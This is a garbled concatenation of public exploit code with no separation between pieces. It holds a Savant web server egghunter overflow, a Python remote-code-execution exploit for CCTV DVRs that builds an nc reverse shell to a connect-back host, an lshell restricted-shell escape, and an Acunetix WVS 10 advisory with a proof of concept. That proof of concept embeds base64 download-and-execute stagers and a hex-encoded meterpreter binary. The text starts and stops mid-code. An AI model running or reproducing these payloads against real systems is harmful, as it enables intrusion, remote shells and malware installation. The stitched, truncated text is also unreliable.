"\xb9\x85\x5f\x8c\x40\x58\x7e\x7c\x5d\x76\x3a\xd6\x0b\x9e\xfe"
"\x88\xc7\x60\x56\x99\x19\x7f\x7a\xda\x93\x72\x99\x3f\x69")

badbuffer = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x52\x30\x63\x58\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7" # egghunter searching for R0cX
badbuffer += "\x90" * (254 - len(badbuffer))
badbuffer += "\x09\x1D\x40" # EIP Overwrite 00401D09 savant.exe POP EBP, RETN
httpmethod = "\xb0\x03\x04\x01\x7B\x14" # MOV AL, 3; ADD AL, 1; JPO 14

sendbuf = httpmethod + " /%" + badbuffer + '\r\n\r\n' + buffer2

sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=sock.connect((target_address,target_port))
sock.send(sendbuf)
sock.close()
#!/usr/bin/python

# Blog post: http://www.kerneronsec.com/2016/02/remote-code-execution-in-cctv-dvrs-of.html

'''
Vendors List

Ademco
ATS Alarmes technolgy and ststems
Area1Protection
Avio
Black Hawk Security
Capture
China security systems
Cocktail Service
Cpsecured
CP PLUS
Digital Eye'z no website
Diote Service & Consulting
DVR Kapta
ELVOX 
ET Vision 
Extra Eye 4 U
eyemotion 
EDS 
Fujitron 
Full HD 1080p
Gazer 
Goldeye 
Goldmaster
Grizzly 
HD IViewer
Hi-View 
Ipcom
IPOX 
IR
ISC Illinois Security Cameras, Inc.
JFL Alarmes 
Lince 
LOT
Lux 
Lynx Security 
Magtec 
Meriva Security 
Multistar 
Navaio
NoVus 
Optivision 
PARA Vision
Provision-ISR 
Q-See 
Questek 
Retail Solution Inc
RIT Huston .com 
ROD Security cameras 
Satvision 
Sav Technology
Skilleye 
Smarteye 
Superior Electrial Systems
TechShell 
TechSon
Technomate 
TecVoz 
TeleEye 
Tomura
truVue
TVT 
Umbrella 
United Video Security System, Inc
Universal IT Solutions
US IT Express
U-Spy Store
Ventetian 
V-Gurad Security
Vid8 
Vtek
Vision Line
Visar
Vodotech.com 
Vook 
Watchman 
Xrplus 
Yansi 
Zetec
ZoomX
'''

from sys import argv
import optparse
from urlparse import urlparse
from re import compile
import socket
import requests
from requests.exceptions import ConnectionError, Timeout, ContentDecodingError
from socket import timeout




def main():

    # parse command line options and atguments
    optparser = optparse.OptionParser(usage="%s <target-url> [options]" % argv[0])
    optparser.add_option('-c','--check',action="store_true",dest="checkvuln", default=False,
                         help="Check if target is vulnerable")
    optparser.add_option('-e','--exploit', action="store", type="string", dest="connback",
                         help="Fire the exploit against the given target URL")

    (options, args) = optparser.parse_args()

    try:
        target = args[0]
    except IndexError:
        optparser.print_help()
        exit()

    target_url = urlparse(target)

    # validating hostname
    if not target_url.hostname:
        print "[X] supplied target \"%s\" is not a valid URL" % target
        optparser.print_help()
        exit()

    # A little hack to handle read timeouts, since urllib2 doesnt give us this functionality.
    socket.setdefaulttimeout(10)

    # is -c flag on check if target url is vulnrable.
    if options.checkvuln is True:
        print "[!] Checking if target \"%s\" is vulnable..." % target_url.netloc
        try:

            # Write file
            raw_url_request('%s://%s/language/Swedish${IFS}&&echo${IFS}1>test&&tar${IFS}/string.js'
                         % (target_url.scheme, target_url.netloc))

            # Read the file.
            response = raw_url_request('%s://%s/../../../../../../../mnt/mtd/test' % (target_url.scheme, target_url.netloc))


            # remove it..
            raw_url_request('%s://%s//language/Swedish${IFS}&&rm${IFS}test&&tar${IFS}/string.js'
                         % (target_url.scheme, target_url.netloc))

        except (ConnectionError, Timeout, timeout) as e:
            print "[X] Unable to connect. reason: %s.  exiting..." % e.message
            return
        if response.text[0] != '1': 
            print "[X] Expected response content first char to be '1' got %s. exiting..." % response.text
            return

        print "[V] Target \"%s\" is vulnerable!" % target_url.netloc



    # if -e is on then fire exploit,
    if options.connback is not None:

        # Validate connect-back information.
        pattern = compile('(?P<host>[a-zA-Z0-9\.\-]+):(?P<port>[0-9]+)')
        match = pattern.search(options.connback)
        if not match:
            print "[X] given connect back \"%s\" should be in the format for host:port" % options.connback
            optparser.print_help()
            exit()

        # fire remote code execution!

        # Three ..
        try:
            raw_url_request('%s://%s/language/Swedish${IFS}&&echo${IFS}nc${IFS}%s${IFS}%s${IFS}>e&&${IFS}/a'
                        % (target_url.scheme, target_url.netloc, match.group('host'), match.group('port')))

        # Two ...

            raw_url_request('%s://%s/language/Swedish${IFS}&&echo${IFS}"-e${IFS}$SHELL${IFS}">>e&&${IFS}/a'
                         % (target_url.scheme, target_url.netloc))


        # One. Left off!
            raw_url_request('%s://%s/language/Swedish&&$(cat${IFS}e)${IFS}&>r&&${IFS}/s'
                         % (target_url.scheme, target_url.netloc))

        except (ConnectionError, Timeout, timeout) as e:
            print "[X] Unable to connect reason: %s.  exiting..." % e.message



        print "[V] Exploit payload sent!, if nothing went wrong we should be getting a reversed remote shell at %s:%s" \
              % (match.group('host'), match.group('port'))


# Disabling URL encode hack
def raw_url_request(url):
    r = requests.Request('GET')
    r.url = url
    r = r.prepare()
    # set url without encoding
    r.url = url

    s = requests.Session()
    return s.send(r)



if __name__ == '__main__':
    main()import paramiko
import traceback
from time import sleep

#
# Exploit lshell pathing vulnerability in <= 0.9.15.
# Runs commands on the remote system.
# @dronesec
#

if len(sys.argv) < 4:
    print '%s: [USER] [PW] [IP] {opt: port}'%(sys.argv[0])
    sys.exit(1)

try:
    print '[!] .............................'
    print '[!] lshell <= 0.9.15 remote shell.'
    print '[!] note: you can also ssh in and execute \'/bin/bash\''
    print '[!] .............................'
    print '[!] Checking host %s...'%(sys.argv[3])
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    if len(sys.argv) == 5:
        ssh.connect(sys.argv[3],port=int(sys.argv[4]),username=sys.argv[1],password=sys.argv[2])
    else:
        ssh.connect(sys.argv[3],username=sys.argv[1],password=sys.argv[2])


    # verify lshell 
    channel = ssh.invoke_shell()
    while not channel.recv_ready(): sleep(1)
    ret = channel.recv(2048)

    channel.send('help help\n')
    while not channel.recv_ready(): sleep(1)
    ret = channel.recv(2048)

    if not 'lshell' in ret:
        if 'forbidden' in ret:
            print '[-] Looks like we can\'t execute SSH commands'
        else:
            print '[-] Environment is not lshell'
        sys.exit(1)

    # verify vulnerable version
    channel.send('sudo\n')
    while not channel.recv_ready(): sleep(1)
    ret = channel.recv(2048)
    if not 'Traceback' in ret:
        print '[-] lshell version not vulnerable.'
        sys.exit(1)
    channel.close()
    ssh.close()

    # exec shell
    print '[+] vulnerable lshell found, preparing pseudo-shell...'
    if len(sys.argv) == 5:
        ssh.connect(sys.argv[3],port=int(sys.argv[4]),username=sys.argv[1],password=sys.argv[2])
    else:
        ssh.connect(sys.argv[3],username=sys.argv[1],password=sys.argv[2])

    while True:
        cmd = raw_input('$ ')

        # breaks paramiko
        if cmd[0] is '/':
            print '[!] Running binaries won\'t work!'
            continue

        cmd = cmd.replace("'", r"\'")
        cmd = 'echo __import__(\'os\').system(\'%s\')'%(cmd.replace(' ',r'\t'))
        if len(cmd) > 1:
            if 'quit' in cmd or 'exit' in cmd:
                break
            (stdin,stdout,stderr) = ssh.exec_command(cmd)
        out = stdout.read()
        print out.strip()
except paramiko.AuthenticationException:
    print '[-] Authentication to %s failed.'%sys.argv[3]
except Exception, e:
    print '[-] Error: ', e
    print type(e)
    traceback.print_exc(file=sys.stdout)
finally:
    channel.close()
    ssh.close()'''
Acunetix WVS 10 - Remote command execution (SYSTEM privilege)

- Author: Daniele Linguaglossa

Overview
=========
Acunetix WVS 10 [1] is an enterprise web vulnerability scanner developer by Acunetix Inc.

Two major flaws exists in the last version of Acunetix, these bug allow a remote attacker,
to execute command in the context of application with SYSTEM privilege.


Details
==========
A first flaw exists in the way Acunetix render some html elements inside gui, in fact it
uses jscript.dll without any concert about unsafe ActiveX object such as WScript.shell.
If acunetix trigger a vulnerability during a scan session it saves a local html with the
content of html page, so is possibile to trigger a fake vulnerability and insert a js 
which trigger the remote command execution.

The second flaw it's about the Acunetix scheduler [2], the scheduler just allow to scan
websites programmatically without any user interaction, is possible to schedule scan
via the web interface on 127.0.0.1:8183 .
like any scan Acunetix, will perform some tests on the targeted Host before real scan,
these test are executed upon some script into folder

C:\ProgramData\Acunetix WVS 10\Data\Scripts

icacls show a bad privileges in this folder, so any user (even guest) will be able to 
replace these custom checks with own ones (Remember first flaw with jscript.dll) :D

C:\ProgramData\Acunetix WVS 10\Data>icacls Scripts
Scripts Everyone:(OI)(CI)(M)
        Everyone:(I)(OI)(CI)(M)
        NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
        BUILTIN\Administrators:(I)(OI)(CI)(F)
        CREATOR OWNER:(I)(OI)(CI)(IO)(F)
        BUILTIN\Users:(I)(OI)(CI)(RX)
        BUILTIN\Users:(I)(CI)(WD,AD,WEA,WA)  <---- UNSAFE [3]

Elaborazione completata per 1 file. Elaborazione non riuscita per 0 file

C:\ProgramData\Acunetix WVS 10\Data>

With this two flaws in mind i wrote a small exploit which is able to obtain RCE via
a meterpreter shell, anyway there are some requirement:

1) Target must have VBS script interpreter
2) Target must have the scheduler service
3) Target must be Windows

Exploit
==========

https://github.com/dzonerzy/acunetix_0day

https://www.youtube.com/watch?v=gWcRlam59Fs (video proof)

Solution
==========

Jscript should be used with limited ActiveX, and permission on C:\ProgramData\Acunetix WVS 10\Data
must be fixed!

Footnotes
_________

[1] http://www.acunetix.com/
[2] http://www.acunetix.com/support/docs/wvs/scheduling-scans/
[3] https://support.microsoft.com/it-it/kb/919240
'''

#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Acunetix  0day SYSTEM Remote Command Execution by Daniele Linguaglossa

This PoC exploit 2 vulnerability in Acunetix core , the first one is a RCE (Remote Command  Exec) and the second one is
a LPE (Local Privilege Escalation).

All credits for this exploit goes to Daniele Linguaglossa
"""

from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
from random import randint
from threading import Thread
from time import sleep
import binascii
import sys
import base64
import os


server = None


def gen_random_name(size):
    alphabet = "abcdefghilmnopqrstuvzABCDEFGHILMNOPQRSTUVZ0123456789"
    name = ""
    for i in range(0, size):
        name += alphabet[randint(0, len(alphabet) - 1)]
    return name + ".vbs"


def ip2b(ip):
    return "".join(binascii.hexlify(chr(int(t))) for t in ip.split("."))


def postexploitation():
    print "[*] Sleeping 1 minutes to elevate privileges...ZzZz"
    sleep(70)  # 2 minutes
    global server
    print "[!] Stopping server !"
    server.shutdown()
    print "[!] Exploit successful wait for session!"

# param URL,FILENAME
PAYLOAD_DOWNLOAD_EXEC = "dHNraWxsIHd2cw0KJGE9JycnDQogU2V0IGZzbyA9IENyZWF0ZU9iamVjdCgiU2NyaXB0aW5nLkZpbGVTeXN0ZW1PYmpl" \
                        "Y3QiKQ0KIFNldCB3c2hTaGVsbCA9IENyZWF0ZU9iamVjdCggIldTY3JpcHQuU2hlbGwiICkNCiBTZXQgT3V0cCA9IFdz" \
                        "Y3JpcHQuU3Rkb3V0DQogU2V0IEZpbGUgPSBXU2NyaXB0LkNyZWF0ZU9iamVjdCgiTWljcm9zb2Z0LlhNTEhUVFAiKQ0K" \
                        "IEZpbGUuT3BlbiAiR0VUIiwgImh0dHA6Ly8lcy9zdGFnZTIiLCBGYWxzZQ0KIE15RmlsZSA9IHdzaFNoZWxsLkV4cGFu" \
                        "ZEVudmlyb25tZW50U3RyaW5ncyggIiVzIiApKyJcJXMiDQogRmlsZS5TZW5kDQogU2V0IEJTID0gQ3JlYXRlT2JqZWN0" \
                        "KCJBRE9EQi5TdHJlYW0iKQ0KIEJTLnR5cGUgPSAxDQogQlMub3Blbg0KIEJTLldyaXRlIEZpbGUuUmVzcG9uc2VCb2R5" \
                        "DQogQlMuU2F2ZVRvRmlsZSBNeUZpbGUsIDINCiB3c2hTaGVsbC5ydW4gIndzY3JpcHQgIitNeUZpbGUNCiBmc28uRGVs" \
                        "ZXRlRmlsZShXc2NyaXB0LlNjcmlwdEZ1bGxOYW1lKQ0KICcnJw0KICRwdGggPSAoZ2V0LWl0ZW0gZW52OlRFTVApLlZh" \
                        "bHVlKyJcc3RhZ2VyLnZicyI7DQogZWNobyAkYSA+ICRwdGgNCiB3c2NyaXB0ICRwdGg="

# param connect back IP
PAYLOAD_METERPETRER = "4d5a90000300000004000000ffff0000b80000000000000040000000000000000000000000000000000000000000000" \
                      "0000000000000000000000000800000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6" \
                      "e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000504500004c010300e4fb66ef000" \
                      "0000000000000e0000f030b01023800020000000e000000000000001000000010000000200000000040000010000000" \
                      "020000040000000100000004000000000000000040000000020000463a0000020000000000200000100000000010000" \
                      "0100000000000001000000000000000000000000030000064000000000000000000000000000000000000000000000" \
                      "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" \
                      "00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002e7" \
                      "465787400000028000000001000000002000000020000000000000000000000000000200030602e64617461000000" \
                      "900a000000200000000c000000040000000000000000000000000000200030e02e6964617461000064000000003000" \
                      "000002000000100000000000000000000000000000400030c000000000000000000000000000000000b800204000ff" \
                      "e090ff253830400090900000000000000000ffffffff00000000ffffffff0000000000000000000000000000000000" \
                      "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" \
                      "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" \
                      "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" \
                      "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" \
                      "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" \
                      "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" \
                      "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" \
                      "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" \
                      "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" \
                      "0000000000000000000000000000000000000000000000000000000000000000000000009090909090909090909090" \
                      "90909090909090909090909090909090909033c0680810400064ff30648920fce8820000006089e531c0648b50308b" \
                      "520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b59" \
                      "2001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581" \
                      "c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6833320000687773325f54684c772607ffd5b89" \
                      "001000029c454506829806b00ffd56a0568%s680200115c89e6505050504050405068ea0fdfe0ffd5976a105657689" \
                      "9a57461ffd585c0740aff4e0875ece8610000006a006a0456576802d9c85fffd583f8007e368b366a4068001000005" \
                      "66a006858a453e5ffd593536a005653576802d9c85fffd583f8007d225868004000006a0050680b2f0f30ffd557687" \
                      "56e4d61ffd55e5eff0c24e971ffffff01c329c675c7c3bbf0b5a2566a0053ffd5190f4da8a063058eceb8f7b69074c" \
                      "4e814a3cae54e8172c60ead9604f2e86b0522895f543ebf148fad021d6146ace15f4ae3dbf55185e896fcaede21b0f" \
                      "db55831cbcfb72949f584986c13ebc8dd35971d7cee480354c83bf909ab61c53b4412733e4cd8dc788890915d41c0b" \
                      "2e06b529fe28c90a777a1a2ff95dc2a6bd697544d0462c01750e7f053c3ee2e1277d13515df7d3dc5ee57419630faf" \
                      "f6c066e12a8ef76cb84891bb64b347b905ceaea1850bc52542cb5a967d538e70d8e7c5335132befb4f87450a5ecdf2" \
                      "7ec89b1ed56e6beb044a950a8022ab5d46d5ba6f37655d35296ade2911292b5179f53d148dffee01672f90f1d82c22" \
                      "b5e253c2637ed99e71e796953a070483bb13cab540c00873b6f5788a1a6e58663cf9cf2ff46b92cbcdad9215a101fb" \
                      "54c71d2112151a19faec99fe5256fced9417f9673ddbb87439860eccedf31e528837cda1251b974f2808bdfc70cafa" \
                      "e32fb6335cdda22e19e64fde514b779dc932bb8249f8d8f260fd457b719980bb069a1ed560e2c74d85182c3aacd499" \
                      "df5dab0e0a0cee9e1da02cff7b89aac3f99de68badc83c9acf3c7518cf1578a58c131e1f3f36d393a7da0979f48115" \
                      "9d687cd9e3d5bc9fe3d34b9c7aa362be497402f21045d1aa7b871e773facc169649d8f64c0ac91d2feb85063169af8" \
                      "87973643f41f9b5c38b01cb2eb327e17d1d0f7f5e8693022c729f69b83723df61b9617f533cf919740edbb92ca86f9" \
                      "f1db8cdf696531559d41193f2356414df49a8e22790a7cb174079b5273c485e252296d690796649048410e29fc8a4d" \
                      "3d3384a98beb5bca12574510183cbaa49f1eee2e7712df55312a40c18e636efe4e7066034e50060e3dcfc5354dc9d9" \
                      "4b570a97d0b47eadc715effc165f9660797fc3ed75d5940262419d75ea5670a029774fa83b5818a7d46a9764de62be" \
                      "e019444d30589d5d778499aaa0b3d10e7897d26fc5e446eb358c7067df52636d8a2ba7340f40e0c263522bb494500d" \
                      "c73585ee9208e29ac7cdf591316712f1624116dc48ebe2c9fa5743e1e4519f82b8be65db56c09e6ef563286050decd" \
                      "f9b327481b045b2073ea4e52ba5c6bb066c2f02709effd1db019cba7b8b682f16749d12ca8c89230edbbecfd59bf51" \
                      "11ea1e6c9ed24ec62bcc37bff84195329a97a41354be5f297dd0edc868edbd35c528f79b9debf6a132b0ee1c140151" \
                      "a90f0c6145149b01e6f55b7e6cc24f015a0f98627fee12834bcf368458827c4c824b1968aa4df58188c5909a95df1f" \
                      "288c88326ee731d240159bba27397cc8b0fe4995ac6445a9033279af56f156d22416b8915f5b64a1acca60e4c1c6b8" \
                      "f33af7431ed674bd62b6b26613cad5f9c9d395c95ee9acc56aacd0f4ea4e198fb6e061d012c91ffa99ecdc1510099f" \
                      "8a4d4fc45273e6687be92c729b719692bb5e197083c4f4b77a1df988cd81141686743fe0e1ace050dec96c0fd8d75e" \
                      "7182ea3cfc0f13c5cf804a8264c67166495837b6da837bb7e382527f63db2f94c75af6c855162aeb3b8a2c362819b9" \
                      "b1d586db76faa0c06346149d2c88379cf186e36056669d4e7cc433cb8205dd0d058c2f6ae74111eeaa6a5883b14e74" \
                      "482d130a665e53b6e89020d600be481779ee7b97631b897608d6933c65fcfc4f630dabe2d0dbad0af7c614d81b679d" \
                      "619ce6a7eefbf94664a40e4772f540dc1964a979f4c25e125844c2a7075f6a6f5fae46dada35d3e83f82d03f87b11e" \
                      "cfb4bf6636d727cf99dae040b8dd3c7abcdb98eabb7e71b56348ce6a3c635299efebc81690288bbab0f6cad2ebfd2a" \
                      "a3d7aa74724b97be8ff3f360017970203ed71039a06799828f0455620fe432ef1dbb79cb87478c6d67e177fa72cbc0" \
                      "c1422a65197e33ee6a4b314992beb18cbaa3bcd00f43cc2749ed61c8d8cb38f512bee5bdb4d4574c0c56b91da064bd" \
                      "5c358dab92d2431b3c90938b4d0ec9661c2e9c98942585466ff7f0a7a5b5b56d825673b46966750cedce33eb0de118" \
                      "c5c4211b1bfc6d297d5d48205ac40a8f47b78988807fa9d312465c1c080b158c01267965e443de442716d3fe8ac029" \
                      "7640ef6d5632eaa784cf2b2b7a884d0589c93d69f8f8d7c6dc2b75a0825c0c5e892268cf3af3843004dc68dd05d367" \
                      "6ac0b218d9adc3ecca734fe7fa61de3272584ed349fffa669175cd8a873b72b7dce3cb4a8e8afa8ddbba2039219220" \
                      "6e9dc808a2ac3f2b6909e71321437b8979f26b9a8bda1fde661229544cb34ebc3ce7a4e0c05d340ba65457c67c3d61" \
                      "5d249af5d333ab3894045480fa8bb3b6c75a41ed9dd00ec8367c68cd41b2b03caa30fc527a00d94b3c25620813ac9d" \
                      "522e6e86cfee45a4f711171ec17f167abc0c4abb6c80de587bb790a1f83b9428d8380832a8216a6b8ea47cac624a24" \
                      "ca171c95ebb6d81bd7676eff464d56436d32b66bb3d190e44e66beb412bd7d5d8978d7e0e93bb0e9f08944a6c45b4a" \
                      "b5e493e0dd1491352d8078b0a3bae30bc2c145bc4e5f9dfd9b457d5dd8ff9c635031b02e7f3b8927b09460b983883a" \
                      "dbb42bdff6f8c017b5096ce7d5a72ab620504be21555aa86871ee9e4887657b8e72d8813b429428596839d00c3e44f" \
                      "fe5297ce95fc340278d1d805370c54f64615db34797f523f0a4cd2523d10d1a1b62146051db23668bc482d802b66bf" \
                      "962f511ec6af7204cbb8d474204bf5c9e52ce0cfbd6298cf96f619a5d64827ba3284b25135965a9062f3cd7eb93745" \
                      "390e9cc983c9a54ec731699bbda53958382cbb2e2ecd3247b18e5c3d64755c0d1e112e8375b5795afdfee8b69879c8" \
                      "6597f79b6df2624dbe59557e8d13918c2d28c91c3a4f49a8682b62648259d118ffa02b2218efa031b45fd54c0b8d14" \
                      "23d494b0a5da8e97ec345e17f9db32e9bec5cbcc36357b4ba8e7b8ccddc192d360d99a1e805dedc0ecadca15a0334f" \
                      "680b0a9e91e12698ba69d27d86b2394c3d91682194ba312e8aef801a9ebc8722af9e8bd1180c0eed3137bfe109b06c" \
                      "a442777eae4e1a145302152777da0a0a1decef0e0c73f2709cdb61360961eb1fc47cec9a893b9a8b2ec9f5a7fcce3e" \
                      "178b459a54d9c5e40c6aada77896a7ee9054324019fe61e954c60dfd7bc895011c951e09fc195e779b71fc33833cdb" \
                      "a5fe76ceb9a7b6ba5a39ed2e80c5d91b15cef0e1f5cb956b90e6db947fa45a4ae0e668b72a056dd29ea81c8b3aa126" \
                      "b35d40c6dfa042cbd19c42b7ef44e6ef7b35952dbc796097530a04a71a3c116e99bf4a4ae8199685cc7e1e9f03a1ce" \
                      "a8eb6d579e1e2ae0800000000000000000000000000000000000000000000000000000000000000000000000000000" \
                      "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" \
                      "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" \
                      "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" \
                      "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" \
                      "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" \
                      "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" \
                      "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" \
                      "00000002c3000000000000000000000543000003830000000000000000000000000000000000000000000000000000" \
                      "040300000000000000000000040300000000000009c004578697450726f63657373000000003000004b45524e454c3" \
                      "3322e646c6c00000000000000000000000000000000000000000000000000000000000000000000000000000000000" \
                      "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" \
                      "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" \
                      "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" \
                      "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" \
                      "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" \
                      "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" \
                      "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" \
                      "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" \
                      "17aa9f565fccd8ce423701840cda9828320ce06749de816ae27196bce0849d1b494f89ffd49"

# param CMD => PAYLOAD_DOWNLOAD_EXEC
EXPLOIT_STAGE_1 = "PGh0bWw+PGhlYWQ+PC9oZWFkPjxib2R5PjxzY3JpcHQ+d2luZG93LmFsZXJ0ID0genl4O3dpbmRvdy5wcm9tcHQgPSB6eXg7d" \
                  "2luZG93LmNvbmZpcm0gPSB6eXg7d2luZG93LmNhbGxlZCA9IDA7ZnVuY3Rpb24genl4KCl7d2luZG93LmNhbGxlZCA9IDE7dm" \
                  "FyIHh5ej0iJXMiO2V2YWwoZnVuY3Rpb24ocCxhLGMsayxlLGQpe2U9ZnVuY3Rpb24oYyl7cmV0dXJuIGMudG9TdHJpbmcoMzY" \
                  "pfTtpZighJycucmVwbGFjZSgvXi8sU3RyaW5nKSl7d2hpbGUoYy0tKXtkW2MudG9TdHJpbmcoYSldPWtbY118fGMudG9TdHJp" \
                  "bmcoYSl9az1bZnVuY3Rpb24oZSl7cmV0dXJuIGRbZV19XTtlPWZ1bmN0aW9uKCl7cmV0dXJuJ1xcdysnfTtjPTF9O3doaWxlK" \
                  "GMtLSl7aWYoa1tjXSl7cD1wLnJlcGxhY2UobmV3IFJlZ0V4cCgnXFxiJytlKGMpKydcXGInLCdnJyksa1tjXSl9fXJldHVybi" \
                  "BwfSgnNSAwPTYgNCgiMy4xIik7MC4yKFwnNyAvOCBkIC9lICIiICJjIiAtYiA5IC1hICJmIlwnKTsnLDE2LDE2LCdceDczXHg" \
                  "2OFx4NjVceDZjXHg2Y3xceDUzXHg2OFx4NjVceDZjXHg2Y3xceDcyXHg3NVx4NmV8XHg1N1x4NTNceDYzXHg3Mlx4NjlceDcw" \
                  "XHg3NHxceDQxXHg2M1x4NzRceDY5XHg3Nlx4NjVceDU4XHg0Zlx4NjJceDZhXHg2NVx4NjNceDc0fHZhcnxuZXd8XHg2M1x4N" \
                  "mRceDY0fEN8Tm9ybWFsfFx4NjVceDZlXHg2M1x4NmZceDY0XHg2NVx4NjRceDYzXHg2Zlx4NmRceDZkXHg2MVx4NmVceDY0fH" \
                  "dpbmRvd1x4NzNceDc0XHg3OVx4NmNceDY1fFx4NzBceDZmXHg3N1x4NjVceDcyXHg3M1x4NjhceDY1XHg2Y1x4NmN8XHg3M1x" \
                  "4NzRceDQxXHg1Mlx4NzR8QnwkJCcucmVwbGFjZSgiJCQiLHh5eikuc3BsaXQoJ3wnKSwwLHt9KSk7ZG9jdW1lbnQuYm9keS5p" \
                  "bm5lckhUTUw9JzQwNCBOb3QgZm91bmQnO308L3NjcmlwdD4lczxzY3JpcHQ+aWYgKHdpbmRvdy5jYWxsZWQgPT0gMCl7enl4K" \
                  "Ck7fTwvc2NyaXB0PjwvYm9keT48L2h0bWw+"


LOGIN_FORM = "PHN0eWxlPg0KYm9keXsNCiAgbWFyZ2luOiAwcHg7DQogIHBhZGRpbmc6IDBweDsNCiAgYmFja2dyb3VuZDogIzFhYmM5ZDsNCn0NCg" \
             "0KaDF7DQogIGNvbG9yOiAjZmZmOw0KICB0ZXh0LWFsaWduOiBjZW50ZXI7DQogIGZvbnQtZmFtaWx5OiBBcmlhbDsNCiAgZm9udC13Z" \
             "WlnaHQ6IG5vcm1hbDsNCiAgbWFyZ2luOiAyZW0gYXV0byAwcHg7DQp9DQoub3V0ZXItc2NyZWVuew0KICBiYWNrZ3JvdW5kOiAjMTMy" \
             "MDJjOw0KICB3aWR0aDogOTAwcHg7DQogIGhlaWdodDogNTQwcHg7DQogIG1hcmdpbjogNTBweCBhdXRvOw0KICBib3JkZXItcmFkaXV" \
             "zOiAyMHB4Ow0KICAtbW96LWJvcmRlci1yYWRpdXM6IDIwcHg7DQogIC13ZWJraXQtYm9yZGVyLXJhZGl1czogMjBweDsNCiAgcG9zaXR" \
             "pb246IHJlbGF0aXZlOw0KICBwYWRkaW5nLXRvcDogMzVweDsNCn0NCg0KLm91dGVyLXNjcmVlbjpiZWZvcmV7DQogIGNvbnRlbnQ6IC" \
             "IiOw0KICBiYWNrZ3JvdW5kOiAjM2U0YTUzOw0KICBib3JkZXItcmFkaXVzOiA1MHB4Ow0KICBwb3NpdGlvbjogYWJzb2x1dGU7DQogI" \
             "GJvdHRvbTogMjBweDsNCiAgbGVmdDogMHB4Ow0KICByaWdodDogMHB4Ow0KICBtYXJnaW46IGF1dG87DQogIHotaW5kZXg6IDk5OTk" \
             "7DQogIHdpZHRoOiA1MHB4Ow0KICBoZWlnaHQ6IDUwcHg7DQp9DQoub3V0ZXItc2NyZWVuOmFmdGVyew0KICBjb250ZW50OiAiIjsNCi" \
             "AgYmFja2dyb3VuZDogI2VjZjBmMTsNCiAgd2lkdGg6IDkwMHB4Ow0KICBoZWlnaHQ6IDg4cHg7DQogIHBvc2l0aW9uOiBhYnNvbHV0Z" \
             "TsNCiAgYm90dG9tOiAwcHg7DQogIGJvcmRlci1yYWRpdXM6IDBweCAwcHggMjBweCAyMHB4Ow0KICAtbW96LWJvcmRlci1yYWRpdXM6" \
             "IDBweCAwcHggMjBweCAyMHB4Ow0KICAtd2Via2l0LWJvcmRlci1yYWRpdXM6IDBweCAwcHggMjBweCAyMHB4Ow0KfQ0KDQouc3RhbmR" \
             "7DQogIHBvc2l0aW9uOiByZWxhdGl2ZTsgIA0KfQ0KDQouc3RhbmQ6YmVmb3Jlew0KICBjb250ZW50OiAiIjsNCiAgcG9zaXRpb246IG" \
             "Fic29sdXRlOw0KICBib3R0b206IC0xNTBweDsNCiAgYm9yZGVyLWJvdHRvbTogMTUwcHggc29saWQgI2JkYzNjNzsNCiAgYm9yZGVyL" \
             "WxlZnQ6IDMwcHggc29saWQgdHJhbnNwYXJlbnQ7DQogIGJvcmRlci1yaWdodDogMzBweCBzb2xpZCB0cmFuc3BhcmVudDsNCiAgd2lkd" \
             "Gg6IDIwMHB4Ow0KICBsZWZ0OiAwcHg7DQogIHJpZ2h0OiAwcHg7DQogIG1hcmdpbjogYXV0bzsNCn0NCg0KLnN0YW5kOmFmdGVyew0K" \
             "ICBjb250ZW50OiAiIjsNCiAgcG9zaXRpb246IGFic29sdXRlOw0KICB3aWR0aDogMjYwcHg7DQogIGxlZnQ6IDBweDsNCiAgcmlnaHQ6" \
             "IDBweDsNCiAgbWFyZ2luOiBhdXRvOw0KICBib3JkZXItYm90dG9tOiAzMHB4IHNvbGlkICNiZGMzYzc7DQogIGJvcmRlci1sZWZ0OiA" \
             "zMHB4IHNvbGlkIHRyYW5zcGFyZW50Ow0KICBib3JkZXItcmlnaHQ6IDMwcHggc29saWQgdHJhbnNwYXJlbnQ7DQogIGJvdHRvbTogLT" \
